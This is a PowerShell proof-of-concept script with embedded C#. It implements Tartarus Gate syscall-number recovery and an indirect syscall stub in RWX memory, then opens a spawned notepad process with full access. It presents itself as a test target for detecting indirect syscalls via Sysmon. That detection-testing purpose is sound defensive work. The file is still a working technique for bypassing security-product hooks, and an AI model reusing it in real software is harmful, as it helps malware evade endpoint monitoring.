# Tartarus Gate + Indirect Syscall POC (PowerShell)
# No .NET runtime install needed - uses .NET Framework via PowerShell 5
# Technique: resolves NtOpenProcess SSN from ntdll stubs, builds indirect syscall
# stub in RWX memory, jumps to ntdll's own "syscall;ret" gadget
# Payload: NtOpenProcess on notepad.exe -> triggers Sysmon Event 10

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class TartarusGate
{
    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int    Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint   Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    public const uint PROCESS_ALL_ACCESS = 0x1FFFFF;
    public const uint MEM_COMMIT_RESERVE = 0x3000;
    public const uint PAGE_EXECUTE_RW    = 0x40;
    public const uint MEM_RELEASE        = 0x8000;

    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern bool   VirtualFree(IntPtr a, uint s, uint t);
    [DllImport("kernel32.dll")] public static extern bool   CloseHandle(IntPtr h);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtOpenProcessFn(
        ref IntPtr ProcessHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        ref CLIENT_ID ClientId);

    public static IntPtr FindSyscallGadget(IntPtr ntdllBase)
    {
        int    e_lfanew   = Marshal.ReadInt32(ntdllBase, 0x3C);
        IntPtr ntHdr      = ntdllBase + e_lfanew;
        short  numSec     = Marshal.ReadInt16(ntHdr, 6);
        short  optHdrSize = Marshal.ReadInt16(ntHdr, 20);
        IntPtr secTable   = ntHdr + 24 + optHdrSize;

        for (int i = 0; i < numSec; i++)
        {
            IntPtr sec  = secTable + i * 40;
            byte[] nb   = new byte[8];
            for (int j = 0; j < 8; j++) nb[j] = Marshal.ReadByte(sec, j);
            string name = Encoding.ASCII.GetString(nb).TrimEnd('\0');
            if (name != ".text") continue;

            uint   rva  = (uint)Marshal.ReadInt32(sec, 12);
            uint   size = (uint)Marshal.ReadInt32(sec, 16);
            IntPtr text = ntdllBase + (int)rva;

            for (uint o = 0; o < size - 2; o++)
            {
                if (Marshal.ReadByte(text, (int)o)     == 0x0F &&
                    Marshal.ReadByte(text, (int)o + 1) == 0x05 &&
                    Marshal.ReadByte(text, (int)o + 2) == 0xC3)
                    return text + (int)o;
            }
        }
        return IntPtr.Zero;
    }

    static bool IsClean(IntPtr va)
    {
        return Marshal.ReadByte(va,0)==0x4C && Marshal.ReadByte(va,1)==0x8B &&
               Marshal.ReadByte(va,2)==0xD1 && Marshal.ReadByte(va,3)==0xB8;
    }

    public static short ResolveSsn(IntPtr ntdllBase, string funcName)
    {
        int    e_lfanew  = Marshal.ReadInt32(ntdllBase, 0x3C);
        IntPtr ntHdr     = ntdllBase + e_lfanew;
        uint   expRva    = (uint)Marshal.ReadInt32(ntHdr, 136);
        IntPtr expDir    = ntdllBase + (int)expRva;

        int  numNames   = Marshal.ReadInt32(expDir, 0x18);
        uint rvaNames   = (uint)Marshal.ReadInt32(expDir, 0x20);
        uint rvaOrds    = (uint)Marshal.ReadInt32(expDir, 0x24);
        uint rvaFuncs   = (uint)Marshal.ReadInt32(expDir, 0x1C);
        IntPtr pNames   = ntdllBase + (int)rvaNames;
        IntPtr pOrds    = ntdllBase + (int)rvaOrds;
        IntPtr pFuncs   = ntdllBase + (int)rvaFuncs;

        int targetOrd = -1;
        for (int i = 0; i < numNames; i++)
        {
            string n = Marshal.PtrToStringAnsi(ntdllBase + (int)(uint)Marshal.ReadInt32(pNames, i*4));
            if (n == funcName) { targetOrd = (ushort)Marshal.ReadInt16(pOrds, i*2); break; }
        }
        if (targetOrd < 0) return -1;

        IntPtr targetVa = ntdllBase + (int)(uint)Marshal.ReadInt32(pFuncs, targetOrd*4);
        if (IsClean(targetVa)) return Marshal.ReadInt16(targetVa, 4);

        // Hooked: scan neighbouring stubs (Tartarus' Gate recovery)
        for (int delta = 1; delta <= 32; delta++)
        {
            foreach (int dir in new[]{-1, +1})
            {
                int nOrd = targetOrd + dir * delta;
                if (nOrd < 0) continue;
                try
                {
                    IntPtr nVa = ntdllBase + (int)(uint)Marshal.ReadInt32(pFuncs, nOrd*4);
                    if (!IsClean(nVa)) continue;
                    short nSsn = Marshal.ReadInt16(nVa, 4);
                    return (short)(nSsn - dir * delta);
                }
                catch { continue; }
            }
        }
        return -1;
    }

    // 4C 8B D1              mov r10, rcx
    // B8 xx xx 00 00        mov eax, <SSN>
    // FF 25 00 00 00 00     jmp [rip+0]      <- indirect: lands in ntdll gadget
    // xx xx xx xx xx xx xx xx  gadget VA
    public static IntPtr BuildStub(short ssn, IntPtr gadget)
    {
        byte[] stub = new byte[22];
        stub[0]=0x4C; stub[1]=0x8B; stub[2]=0xD1;
        stub[3]=0xB8;
        stub[4]=(byte)(ssn & 0xFF); stub[5]=(byte)((ssn>>8)&0xFF);
        stub[6]=0x00; stub[7]=0x00;
        stub[8]=0xFF; stub[9]=0x25;
        stub[10]=0x00; stub[11]=0x00; stub[12]=0x00; stub[13]=0x00;
        long g = gadget.ToInt64();
        for (int i = 0; i < 8; i++) stub[14+i] = (byte)((g >> (i*8)) & 0xFF);

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, MEM_COMMIT_RESERVE, PAGE_EXECUTE_RW);
        if (mem == IntPtr.Zero) return IntPtr.Zero;
        Marshal.Copy(stub, 0, mem, stub.Length);
        return mem;
    }
}
'@ -Language CSharp

Write-Host "[*] Tartarus Gate + Indirect Syscall POC" -ForegroundColor Cyan
Write-Host "[*] Test target for ETWInspector Sysmon detection"
Write-Host ""

# 1. ntdll base
$ntdll = [TartarusGate]::GetModuleHandle("ntdll.dll")
Write-Host ("[*] ntdll base          : 0x{0:X16}" -f $ntdll.ToInt64())

# 2. Find syscall;ret gadget in ntdll .text
$gadget = [TartarusGate]::FindSyscallGadget($ntdll)
if ($gadget -eq [IntPtr]::Zero) { Write-Host "[-] gadget not found"; exit }
Write-Host ("[*] syscall;ret gadget  : 0x{0:X16}" -f $gadget.ToInt64())

# 3. Resolve SSN
$ssn = [TartarusGate]::ResolveSsn($ntdll, "NtOpenProcess")
if ($ssn -lt 0) { Write-Host "[-] Could not resolve SSN"; exit }
Write-Host ("[*] NtOpenProcess SSN   : 0x{0:X4} ({1})" -f $ssn, $ssn)

# 4. Build indirect stub in RWX memory
$stub = [TartarusGate]::BuildStub($ssn, $gadget)
if ($stub -eq [IntPtr]::Zero) { Write-Host "[-] VirtualAlloc failed"; exit }
Write-Host ("[*] Indirect stub at    : 0x{0:X16}" -f $stub.ToInt64())
Write-Host ""

# 5. Spawn notepad as target
$notepad = Start-Process notepad -PassThru
Write-Host "[*] Spawned notepad.exe PID: $($notepad.Id)"
Start-Sleep -Milliseconds 800

# 6. Call NtOpenProcess via indirect syscall
Write-Host "[*] Calling NtOpenProcess via indirect syscall..."

$ntOpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $stub, [TartarusGate+NtOpenProcessFn])

$hProcess = [IntPtr]::Zero
$oa  = New-Object TartarusGate+OBJECT_ATTRIBUTES
$oa.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($oa)
$cid = New-Object TartarusGate+CLIENT_ID
$cid.UniqueProcess = [IntPtr]$notepad.Id

$status = $ntOpenProcess.Invoke([ref]$hProcess, [TartarusGate]::PROCESS_ALL_ACCESS, [ref]$oa, [ref]$cid)

if ($status -eq 0) {
    Write-Host ("[+] NtOpenProcess OK  handle: 0x{0:X}" -f $hProcess.ToInt64()) -ForegroundColor Green
    Write-Host "[+] Sysmon Event 10 fired -- ETWInspector should flag INDIRECT_SYSCALL" -ForegroundColor Green
    [TartarusGate]::CloseHandle($hProcess) | Out-Null
} else {
    Write-Host ("[!] NtOpenProcess failed  NTSTATUS: 0x{0:X8}" -f $status) -ForegroundColor Yellow
}

[TartarusGate]::VirtualFree($stub, 0, [TartarusGate]::MEM_RELEASE) | Out-Null
Start-Sleep -Milliseconds 500
Stop-Process -Id $notepad.Id -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "[*] Done." -ForegroundColor Cyan
